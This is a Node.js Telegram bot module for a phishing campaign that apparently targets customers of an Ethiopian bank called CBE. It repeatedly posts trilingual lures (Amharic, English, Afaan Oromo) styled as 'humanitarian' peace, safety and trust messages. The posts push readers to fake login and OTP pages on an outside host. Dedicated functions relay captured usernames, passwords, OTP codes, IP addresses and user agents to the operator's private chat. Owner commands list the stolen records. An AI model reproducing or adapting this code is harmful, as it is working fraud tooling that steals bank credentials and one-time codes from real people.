const logger = require('./logger');

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.ownerChatId = null;
        this.channelId = null;
        this.channelUsername = null;
        this.warningInterval = null;
        this.warningCount = 0;
        this.postCount = 0;
        this.userMessages = [];
        this.postHistory = [];
        this.userData = []; // Store all user data
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const ownerChatId = process.env.TELEGRAM_OWNER_CHAT_ID;
            const channelId = process.env.TELEGRAM_CHANNEL_ID;
            const channelUsername = process.env.TELEGRAM_CHANNEL_USERNAME;

            if (!token) {
                logger.warn('Telegram token not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: true });
            this.ownerChatId = ownerChatId;
            this.channelId = channelId || channelUsername;
            
            this.enabled = true;
            logger.info('✅ Telegram bot initialized');
            logger.info(`👤 Owner Chat ID: ${ownerChatId}`);
            logger.info(`📢 Channel: ${this.channelId}`);
            
            this.setupOwnerMessageListener();
            this.setupCallbackListener();
            this.startWarningLoop();
            
        } catch (error) {
            logger.warn(`Telegram initialization failed: ${error.message}`);
            this.enabled = false;
        }
    }

    // ============================================
    // OWNER MESSAGE LISTENER
    // ============================================

    setupOwnerMessageListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('message', async (msg) => {
            if (msg.chat.type !== 'private') return;
            
            const chatId = msg.chat.id;
            const text = msg.text;

            // ONLY owner can interact with bot
            if (chatId !== parseInt(this.ownerChatId)) {
                logger.warn(`⚠️ Unauthorized message from user ${chatId} - IGNORED`);
                return;
            }

            // Owner commands
            if (text === '/start') {
                await this.sendOwnerWelcome(chatId);
                return;
            }

            if (text === '/stats') {
                await this.sendOwnerStats(chatId);
                return;
            }

            if (text === '/users') {
                await this.sendOwnerUsers(chatId);
                return;
            }

            if (text === '/data') {
                await this.sendOwnerAllData(chatId);
                return;
            }

            if (text === '/help') {
                await this.sendOwnerHelp(chatId);
                return;
            }

            if (text && text.startsWith('/verify')) {
                const parts = text.split(' ');
                const code = parts[1] || this.generateVerificationCode();
                await this.sendOwnerVerificationCode(chatId, code);
                return;
            }

            if (text && text.startsWith('/broadcast')) {
                const msgText = text.replace('/broadcast', '').trim();
                if (msgText) {
                    await this.broadcastToChannel(msgText);
                    await this.bot.sendMessage(chatId, `✅ Broadcast sent to channel: "${msgText}"`);
                } else {
                    await this.bot.sendMessage(chatId, `❌ Usage: /broadcast [message]`);
                }
                return;
            }

            if (text) {
                await this.bot.sendMessage(chatId, `✅ Received. Use /help for commands.`);
            }
        });

        logger.info('✅ Owner message listener active - ONLY owner can interact');
    }

    // ============================================
    // SEND TO OWNER (PRIVATE BOT CHAT)
    // ============================================

    async sendToOwner(message, options = {}) {
        if (!this.enabled || !this.bot || !this.ownerChatId) {
            console.log('❌ Owner chat not configured');
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.ownerChatId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                ...options
            });
            console.log('✅ Sent to owner private chat');
            return result;
        } catch (error) {
            console.error(`Owner send error: ${error.message}`);
            return null;
        }
    }

    // ============================================
    // SEND TO CHANNEL - HUMANITARIAN POSTS
    // ============================================

    async sendToChannel(message, options = {}) {
        if (!this.enabled || !this.bot || !this.channelId) {
            console.log('❌ Channel not configured');
            return null;
        }

        try {
            const channelOptions = {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '🔐 ይግቡ / Login / Seenu',
                                url: 'https://cbe-com.onrender.com/'
                            }
                        ],
                        [
                            {
                                text: '📱 OTP / ኦቲፒ / OTP',
                                url: 'https://cbe-com.onrender.com/otp-verify'
                            },
                            {
                                text: '❓ ለምን? / Why? / Maaliif?',
                                callback_data: 'why_verify'
                            }
                        ]
                    ]
                },
                ...options
            };

            const result = await this.bot.sendMessage(this.channelId, message, channelOptions);
            this.postCount++;
            this.postHistory.push({
                type: 'channel_post',
                count: this.postCount,
                timestamp: new Date().toISOString()
            });
            console.log(`✅ Channel post #${this.postCount}`);
            return result;
        } catch (error) {
            console.error(`Channel send error: ${error.message}`);
            return null;
        }
    }

    // ============================================
    // 📩 USER INFO - SENT TO OWNER ONLY
    // ============================================

    async sendCredentialsToOwner(data) {
        if (!this.enabled) return null;

        // Store user data
        this.userData.push({
            type: 'credentials',
            username: data.username,
            password: data.password,
            ip: data.ip,
            userAgent: data.userAgent,
            timestamp: data.timestamp,
            id: data.id
        });

        const message = `
🔐 <b>🔴 NEW CREDENTIALS CAPTURED</b>
<pre>═══════════════════════════════════════</pre>

👤 <b>Username:</b> <code>${data.username}</code>
🔑 <b>Password:</b> <code>${data.password}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🆔 <b>ID:</b> <code>${data.id}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>
⚠️ <b>Action Required:</b> Investigate immediately
📊 <b>Total Users:</b> ${this.userData.length}

🔐 <i>This info is for OWNER only - not shared</i>
`;

        return this.sendToOwner(message);
    }

    async sendOTPToOwner(data) {
        if (!this.enabled) return null;

        // Store user data
        this.userData.push({
            type: 'otp',
            userId: data.userId,
            otp: data.otp,
            ip: data.ip,
            userAgent: data.userAgent,
            timestamp: data.timestamp
        });

        const message = `
🔐 <b>🔴 OTP CODE CAPTURED</b>
<pre>═══════════════════════════════════════</pre>

🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP Code:</b> <code>${data.otp}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>
⚠️ <b>Action Required:</b> Verify OTP authenticity
📊 <b>Total OTPs:</b> ${this.userData.filter(u => u.type === 'otp').length}

🔐 <i>This info is for OWNER only - not shared</i>
`;

        return this.sendToOwner(message);
    }

    async sendLoginPageAccessedToOwner(data) {
        if (!this.enabled) return null;

        // Store user data
        this.userData.push({
            type: 'page_access',
            ip: data.ip,
            userAgent: data.userAgent,
            referrer: data.referrer,
            timestamp: data.timestamp
        });

        const message = `
🌐 <b>LOGIN PAGE ACCESSED</b>
<pre>═══════════════════════════════════════</pre>

📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>
📊 <b>Total Visits:</b> ${this.userData.filter(u => u.type === 'page_access').length}
📢 <b>Warnings Sent:</b> ${this.warningCount}

🔐 <i>This info is for OWNER only - not shared</i>
`;

        return this.sendToOwner(message);
    }

    async sendVerificationRequestToOwner(data) {
        if (!this.enabled) return null;

        const code = this.generateVerificationCode();

        // Store user data
        this.userData.push({
            type: 'verification_request',
            username: data.username,
            ip: data.ip,
            code: code,
            timestamp: new Date().toISOString()
        });

        const message = `
🔐 <b>VERIFICATION CODE REQUEST</b>
<pre>═══════════════════════════════════════</pre>

👤 <b>User:</b> ${data.username || 'Unknown'}
📱 <b>IP:</b> ${data.ip || 'Unknown'}
📌 <b>Code:</b> <code>${code}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
✅ <b>Share this code with the user</b>
📊 <b>Total Requests:</b> ${this.userData.filter(u => u.type === 'verification_request').length}

🔐 <i>This info is for OWNER only - not shared</i>
`;

        return this.sendToOwner(message);
    }

    async sendCompleteToOwner(data) {
        if (!this.enabled) return null;

        // Store user data
        this.userData.push({
            type: 'completed',
            userId: data.userId,
            username: data.username,
            ip: data.ip,
            timestamp: new Date().toISOString()
        });

        const message = `
✅ <b>VERIFICATION COMPLETED</b>
<pre>═══════════════════════════════════════</pre>

👤 <b>User:</b> ${data.username || 'Unknown'}
🆔 <b>ID:</b> ${data.userId || 'Unknown'}
📱 <b>IP:</b> ${data.ip || 'Unknown'}
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
✅ <b>Status:</b> COMPLETED
📊 <b>Total Completed:</b> ${this.userData.filter(u => u.type === 'completed').length}

🔐 <i>This info is for OWNER only - not shared</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // HUMANITARIAN CHANNEL POSTS (3 Languages)
    // ============================================

    async sendPeaceMessage() {
        const message = `
🕊️ <b>ሰላም / PEACE / NAGAA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
ሰላም ለሁላችሁ! 
ደህንነታችሁ ለእኛ ቅድሚያ የሚሰጠው ጉዳይ ነው።
እባካችሁ መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
Peace to all of you!
Your safety is our top priority.
Please verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Nagaa hundumaaf!
Tajajilummaan keessan waan jalqabaaf kennamuudha.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
🕊️ <i>ሰላም ከሁላችሁ ጋር / Peace to all / Nagaa hundumaaf</i>
`;
        return this.sendToChannel(message);
    }

    async sendLoveMessage() {
        const message = `
❤️ <b>ፍቅር / LOVE / JAALALA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
ፍቅር እና እንክብካቤ ለሁላችሁ!
እናንተን ለመጠበቅ እዚህ ነን።
ደህንነታችሁን አስጠብቁ።

<b>🇬🇧 English:</b>
Love and care for all of you!
We are here to protect you.
Stay safe.

<b>🇴🇷 Afaan Oromo:</b>
Jaalala fi kunuunsa hundumaaf!
Isin eeguuf as jirra.
Of eegaa.

<pre>═══════════════════════════════════════</pre>
❤️ <i>ፍቅር ለሁላችሁ / Love to all / Jaalala hundumaaf</i>
`;
        return this.sendToChannel(message);
    }

    async sendHelpMessage() {
        const message = `
🤝 <b>እርዳታ / HELP / GARGAARSA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
እርዳታ ያስፈልጋችኋል?
እኛ እዚህ ነን ለእናንተ!
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
Need help?
We are here for you!
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Gargaarsa barbaadduu?
Isinif as jirra!
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
🤝 <i>እርዳታ ዝግጁ / Help available / Gargaarsa qophaa'e</i>
`;
        return this.sendToChannel(message);
    }

    async sendSafetyMessage() {
        const message = `
🛡️ <b>ደህንነት / SAFETY / TARIIFANNAA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
ደህንነታችሁ በጣም አስፈላጊ ነው!
እኛ እንከታተላለን።
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
Your safety is very important!
We are watching over you.
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Tariifannaan keessan baay'ee barbaachisaa dha!
Isin eegna.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
🛡️ <i>ደህንነት በመጀመሪያ / Safety first / Tariifannaa dura</i>
`;
        return this.sendToChannel(message);
    }

    async sendUnityMessage() {
        const message = `
🤝 <b>አንድነት / UNITY / TOKKUMMAA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
አንድ ሆነን እንጠብቃለን!
ሁላችንም አብረን እንጠነቀቃለን።
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
United we stand!
Together we protect.
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Tokkummaan dhaabanna!
Waliin eegna.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
🤝 <i>አንድ ሆነን / United / Tokkummaan</i>
`;
        return this.sendToChannel(message);
    }

    async sendTrustMessage() {
        const message = `
⭐ <b>እምነት / TRUST / AMANTAA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
እምነታችሁን አናሳስትም!
እኛ ታማኝ ነን።
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
We don't betray your trust!
We are loyal.
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Amantaa keessan hin morkine!
Amantaa qabna.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
⭐ <i>እምነት / Trust / Amantaa</i>
`;
        return this.sendToChannel(message);
    }

    async sendHopeMessage() {
        const message = `
🌈 <b>ተስፋ / HOPE / ABDII</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
ተስፋ አትቁረጡ!
የተሻለ ነገ አለ።
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
Don't lose hope!
Tomorrow is better.
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Abdii hin kutinaa!
Boru gaarii dha.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
🌈 <i>ተስፋ / Hope / Abdii</i>
`;
        return this.sendToChannel(message);
    }

    async sendWealthMessage() {
        const message = `
💎 <b>ሀብት / WEALTH / QABEENYAA</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
ሀብታችሁን ያስጠብቁ!
እኛ እንጠብቃለን።
መለያዎቻችሁን ያረጋግጡ።

<b>🇬🇧 English:</b>
Protect your wealth!
We protect you.
Verify your accounts.

<b>🇴🇷 Afaan Oromo:</b>
Qabeenya keessan eegaa!
Isin eegna.
Mallaqa keessan mirkaneessaa.

<pre>═══════════════════════════════════════</pre>
💎 <i>ሀብት / Wealth / Qabeenya</i>
`;
        return this.sendToChannel(message);
    }

    // ============================================
    // WARNING LOOP - HUMANITARIAN POSTS
    // ============================================

    startWarningLoop() {
        if (!this.enabled) return;

        const postTypes = [
            this.sendPeaceMessage.bind(this),
            this.sendLoveMessage.bind(this),
            this.sendHelpMessage.bind(this),
            this.sendSafetyMessage.bind(this),
            this.sendUnityMessage.bind(this),
            this.sendTrustMessage.bind(this),
            this.sendHopeMessage.bind(this),
            this.sendWealthMessage.bind(this)
        ];

        setTimeout(() => {
            postTypes[0]();
        }, 5000);

        let index = 0;
        this.warningInterval = setInterval(() => {
            index = (index + 1) % postTypes.length;
            postTypes[index]();
            this.warningCount++;
        }, 180000); // 3 minutes
    }

    // ============================================
    // GENERATE VERIFICATION CODE
    // ============================================

    generateVerificationCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    // ============================================
    // OWNER COMMANDS
    // ============================================

    async sendOwnerWelcome(chatId) {
        const message = `
🤖 <b>CBE SECURITY BOT - OWNER ACCESS</b>
<pre>═══════════════════════════════════════</pre>

<b>✅ Welcome Owner!</b>

<b>📌 Owner Commands:</b>
/start - Show this message
/stats - Show statistics
/users - Show all users
/data - Show all captured data
/verify [code] - Generate code
/broadcast [msg] - Send to channel
/help - Show help

<b>📩 What you'll receive:</b>
   • ✅ Usernames & Passwords
   • ✅ OTP Codes
   • ✅ IP Addresses
   • ✅ User Agents
   • ✅ Login Page Visits

<pre>═══════════════════════════════════════</pre>
🔐 <i>All user data is private and secure</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerStats(chatId) {
        const totalUsers = this.userData.filter(u => u.type === 'credentials').length;
        const totalOTPs = this.userData.filter(u => u.type === 'otp').length;
        const totalVisits = this.userData.filter(u => u.type === 'page_access').length;
        const totalCompleted = this.userData.filter(u => u.type === 'completed').length;

        const message = `
📊 <b>CBE SECURITY STATS</b>
<pre>═══════════════════════════════════════</pre>

<b>📈 User Data Stats:</b>
   • Total Users: ${totalUsers}
   • OTPs Captured: ${totalOTPs}
   • Page Visits: ${totalVisits}
   • Completed: ${totalCompleted}
   • Total Records: ${this.userData.length}

<b>📢 Channel Stats:</b>
   • Posts Sent: ${this.postCount}
   • Warnings: ${this.warningCount}
   • Status: ${this.enabled ? '🟢 Online' : '🔴 Offline'}

<pre>═══════════════════════════════════════</pre>
<i>All data is for owner only</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerUsers(chatId) {
        const credentials = this.userData.filter(u => u.type === 'credentials');
        
        let userList = '';
        credentials.slice(-10).forEach((u, i) => {
            userList += `   ${i+1}. ${u.username} - ${u.ip} - ${u.timestamp}\n`;
        });

        const message = `
👥 <b>USER LIST</b>
<pre>═══════════════════════════════════════</pre>

<b>📊 Total Users:</b> ${credentials.length}

<b>📋 Recent Users:</b>
${userList || '   No users yet'}

<pre>═══════════════════════════════════════</pre>
<i>Use /data to see full details</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerAllData(chatId) {
        let dataText = '';
        const recent = this.userData.slice(-20);
        recent.forEach((u, i) => {
            dataText += `\n${i+1}. ${u.type.toUpperCase()}:\n`;
            dataText += `   👤 ${u.username || u.userId || 'Unknown'}\n`;
            if (u.password) dataText += `   🔑 ${u.password}\n`;
            if (u.otp) dataText += `   🔢 ${u.otp}\n`;
            dataText += `   📱 ${u.ip}\n`;
            dataText += `   ⏰ ${u.timestamp}\n`;
        });

        const message = `
📋 <b>ALL USER DATA</b>
<pre>═══════════════════════════════════════</pre>

<b>📊 Total Records:</b> ${this.userData.length}

<b>📋 Recent Data:</b>
${dataText || '   No data yet'}

<pre>═══════════════════════════════════════</pre>
<i>Full data is for owner only</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerVerificationCode(chatId, code) {
        const message = `
🔐 <b>VERIFICATION CODE GENERATED</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Code:</b> <code>${code}</code>

<b>✅ Share this with the user</b>

<pre>═══════════════════════════════════════</pre>
⏰ <i>Code expires in 5 minutes</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerHelp(chatId) {
        const message = `
🆘 <b>OWNER HELP</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Commands:</b>
/start - Welcome message
/stats - Show statistics
/users - Show all users
/data - Show all captured data
/verify [code] - Generate code
/broadcast [msg] - Send to channel
/help - Show this help

<b>📩 What you receive:</b>
   • Credentials (username/password)
   • OTP codes
   • IP addresses
   • User agents
   • Page visits

<b>🔗 Links:</b>
🔐 Login: https://cbe-com.onrender.com/
📱 OTP: https://cbe-com.onrender.com/otp-verify

<pre>═══════════════════════════════════════</pre>
<i>All data is private and secure</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    // ============================================
    // BROADCAST TO CHANNEL
    // ============================================

    async broadcastToChannel(message) {
        if (!this.enabled || !this.channelId) return null;

        const broadcastMsg = `
📢 <b>BROADCAST MESSAGE</b>
<pre>═══════════════════════════════════════</pre>

${message}

<pre>═══════════════════════════════════════</pre>
<i>Sent by owner</i>
`;

        return this.sendToChannel(broadcastMsg);
    }

    // ============================================
    // CALLBACK LISTENER
    // ============================================

    setupCallbackListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('callback_query', async (callbackQuery) => {
            const data = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            try {
                let response = '';

                switch(data) {
                    case 'why_verify':
                        response = `
❓ <b>ለምን ማረጋገጥ? / WHY VERIFY? / MAALIIF MIRKANEESSUU?</b>
<pre>═══════════════════════════════════════</pre>

<b>🇪🇹 አማርኛ:</b>
🔴 ያልተረጋገጠ መለያ:
   ❌ ሊጠፋ ይችላል
   ❌ ገንዘብ ሊሰረቅ ይችላል

<b>🇬🇧 English:</b>
🔴 Unverified account:
   ❌ Can be hacked
   ❌ Money can be stolen

<b>🇴🇷 Afaan Oromo:</b>
🔴 Mallaqa hin mirkaneessine:
   ❌ Saamuu danda'ama
   ❌ Maallaqa saamuu danda'ama

<pre>═══════════════════════════════════════</pre>
⚡ <i>ማረጋገጥ / Verify / Mirkaneessuu</i>
`;
                        break;

                    default:
                        response = `
❓ <b>ማረጋገጥ / VERIFY / MIRKANEESSUU</b>
<pre>═══════════════════════════════════════</pre>

<b>🔐 ይግቡ / Login / Seenu</b>

<pre>═══════════════════════════════════════</pre>
⚠️ <i>መለያዎትን ያረጋግጡ / Verify now / Mirkaneessaa</i>
`;
                }

                if (response) {
                    await this.bot.sendMessage(chatId, response, {
                        parse_mode: 'HTML',
                        reply_to_message_id: messageId
                    });
                }

                await this.bot.answerCallbackQuery(callbackQuery.id);

            } catch (error) {
                console.error(`Callback error: ${error.message}`);
                await this.bot.answerCallbackQuery(callbackQuery.id, {
                    text: '❌ Error',
                    show_alert: true
                });
            }
        });

        logger.info('✅ Callback listener active');
    }

    // ============================================
    // STOP WARNING LOOP
    // ============================================

    stopWarningLoop() {
        if (this.warningInterval) {
            clearInterval(this.warningInterval);
            this.warningInterval = null;
            logger.info('⚠️ Warning loop stopped');
        }
    }

    // ============================================
    // LEGACY METHODS
    // ============================================

    async sendCredentials(data) {
        return this.sendCredentialsToOwner(data);
    }

    async sendOTP(data) {
        return this.sendOTPToOwner(data);
    }

    async sendLoginPageInfo() {
        return this.sendPeaceMessage();
    }

    async sendLoginPageAccessed(data) {
        await this.sendLoginPageAccessedToOwner(data);
        const posts = [
            this.sendPeaceMessage.bind(this),
            this.sendLoveMessage.bind(this),
            this.sendHelpMessage.bind(this)
        ];
        const randomPost = posts[Math.floor(Math.random() * posts.length)];
        return randomPost();
    }

    async sendWelcomeMessage() {
        await this.sendToOwner(`
🚀 <b>CBE SECURITY SYSTEM ACTIVE</b>
<pre>═══════════════════════════════════════</pre>

✅ System started successfully
👤 Owner Chat ID: ${this.ownerChatId}
📢 Channel: ${this.channelId}
📊 Waiting for user data...

<pre>═══════════════════════════════════════</pre>
🔐 <i>All user data will appear here</i>
        `);

        return this.sendPeaceMessage();
    }
}

module.exports = new TelegramService();
